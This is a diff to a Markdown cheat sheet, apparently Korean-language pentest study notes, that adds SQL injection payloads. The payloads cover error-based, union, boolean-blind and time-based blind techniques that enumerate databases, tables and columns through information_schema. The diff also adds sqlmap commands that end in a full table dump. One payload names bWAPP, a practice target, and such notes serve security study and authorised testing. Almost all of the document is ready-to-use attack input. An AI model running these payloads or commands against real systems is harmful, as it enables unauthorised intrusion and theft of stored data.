@@ -106,6 +106,22 @@ Example 1.
 
 ## 🚩 Offensive techniques
 
+### Error based
+
+```
+' or 1=1 --
+
+' and 1=1 --
+
+' and 1=0 --
+
+' or 'a'='a #
+
+' or 1=1 and select schema_name from information_schema.schemata;
+```
+
+<br>
+
 ### Union
 
 ```
@@ -133,13 +149,65 @@ Example 1.
 
 0 union select null #
 
-0 union select host, user, password from mysql.user
+0 union select [column_name] from [table_name]
 
 0 union select table_schema,table_name,column_name from information_schema.columns
 
 0 union select table_schema,table_name,column_name from information_schema.columns where table_schema!="mysql" and table_schema!="information_schema"
 
-' or 'a'='a #
+0, (select table_name from information_schema.tables))#
+```
+
+<br>
+
+### Blind - Boolean based
+
+```
+' or 'a'='a
+
+' or 1=1 #
+
+' or 1=2 #
+
+' or 1=1 and length(database()) = [1,2,3 ...] #
+
+' or 1=1 and substr(database()) = "[a,b,c ...]" #
+
+' or 1=1 and ascii(database()) = [1,2,3 ...] #
+
+' or 1=1 and length((select table_name from information_schema.tables where table_type="base table" and table_schema="[table_name]" limit 0,1))=[1,2,3 ...] #
+
+' or 1=1 and ascii(substr((select table_name from information_schema.tables where table_type='base table' and table_schema='[table_name]' limit 0,1),1,1)) > 100 #
+
+' or 1=1 and length((select column_name from information_schema.columns where table_name='[table_name]' limit 0,1)) = [1,2,3 ...]#
+
+' or 1=1 and substr((select column_name from information_schema.columns where table_name='[table_name]' limit 0,1),1,1) = '[a,b,c ...]'#
+
+' or 1=1 and sha1("[]")=(select [] from [] where login='[]')#
+
+' or length(database()) = 5 and 'a' = 'a
+```
+
+<br>
+
+### Blind - Time based
+
+```
+' or sleep(5) and 'a' = 'a
+
+' or 1=1 and sleep(5) #
+
+' or 1=1 and length(database())=[1,2,3 ...] and sleep(5)#
+
+' or 1=1 and substr(database(),1,1)=[a,b,c ...] and sleep(5)#
+
+' or 1=1 and length((select table_name from information_schema.tables where table_type="base table" and table_schema="[database_name]" limit 0,1))=[1,2,3 ...] and sleep(5) #
+
+' or 1=1 and ascii(substr((select table_name from information_schema.tables where table_type="base table" and table_schema="bWAPP" limit 0,1),1,1)) > 100 and sleep(5) #
+
+' or 1=1 and length((select column_name from information_schema.columns where table_name=[table_name] limit 0,1))=[1,2,3 ...] and sleep(5) #
+
+' or 1=1 and substr((select column_name from information_schema.columns where table_name="[table_name]" limit 0,1),1,1) = "[a,b,c ...]" and sleep(5) #
 ```
 
 <br>
@@ -152,6 +220,12 @@ sqlmap -u "[주소]" --cookie="[cookie]" --data "[파라미터]" -DBs
 sqlmap -u "[주소]" --cookie="[cookie]" --data "[파라미터]" -p "[취약한 파라미터]" --tables
 
 sqlmap -u "[주소]" --cookie="[cookie]" --data "[파라미터]" -p "[취약한 파라미터]" --columns
+
+sqlmap -u "[주소]" --cookie="[cookie]" --data "[파라미터]" -p "[취약한 파라미터]" -D [database_name] --tables
+
+sqlmap -u "[주소]" --cookie="[cookie]" --data "[파라미터]" -p "[취약한 파라미터]" -D [database_name] -T [table_name] --columns
+
+sqlmap -u "[주소]" --cookie="[cookie]" --data "[파라미터]" -p "[취약한 파라미터]" -D [database_name] -T [table_name] -C [column_name] --dump --batch
 ```
 
 <br>
@@ -247,3 +321,5 @@ https://ssunws.tistory.com/44
 https://noirstar.tistory.com/264
 
 https://pentestmonkey.net/category/cheat-sheet/sql-injection - cheat sheet
+
+https://velog.io/@jdk9908/SQL-Injection-Informationschema-%EC%82%AC%EC%9A%A9
